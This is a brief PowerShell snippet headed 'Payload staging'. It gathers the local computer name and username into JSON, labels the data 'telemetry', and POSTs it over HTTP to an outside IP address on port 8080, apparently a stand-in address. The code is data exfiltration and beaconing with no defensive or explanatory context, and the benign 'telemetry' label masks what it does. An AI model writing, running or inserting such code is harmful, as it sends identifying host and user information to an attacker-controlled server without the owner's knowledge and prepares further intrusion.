
<# Payload staging #> $PayloadJson = [ordered]@{ Host = $env:COMPUTERNAME; User = $env:USERNAME; Stage = "telemetry" } | ConvertTo-Json; Invoke-RestMethod -Uri "http://203.0.113.250:8080/upload" -Method Post -Body $PayloadJson -ContentType "application/json"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
